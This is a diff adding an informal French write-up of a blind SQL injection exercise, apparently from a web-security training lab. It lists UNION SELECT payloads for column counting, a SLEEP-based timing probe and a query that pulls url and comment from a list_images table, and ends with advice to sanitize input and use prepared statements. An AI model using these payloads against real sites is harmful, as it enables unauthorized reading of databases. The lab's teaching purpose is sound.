@@ -1,0 +1,19 @@
+Ici il est encore question de sql injection avec une petite difficulté en plus c'est que l'on ne voie pas de résultat en cas d'erreur ce qui ne va pas nous permettre d'interpreter ce qui se passe.
+
+
+tout dabord je recherche a l aveulge le nombre de colonne voulu.
+1 UNION SELECT NULL, NULL--
+ici il y en a encore deux
+je met un sleep dans ma requete pour voir si la requete est retourner le apres le sleep
+1 UNION SELECT SLEEP(3) column_name, table_name FROM information_schema.columns;
+ici sa marche pas mais cela avais marcher, en tout cas on peut voir qu'il se passe quelque chose.
+donc il nous reste a enlever le sleep
+1 UNION SELECT SLEEP(3) column_name, table_name FROM information_schema.columns;
+on recherche la table qui pourrais nous interesser ici quoi de mieux que list_images.
+1  OR 1 = 1 UNION   SELECT  url, comment FROM list_images
+on regarde donc les comment comme pour les users et c est bon
+
+protection
+
+faire du travail sur les chaine de character avant de l inclure dans les requete
+le mieux et de faire des requetes préparées
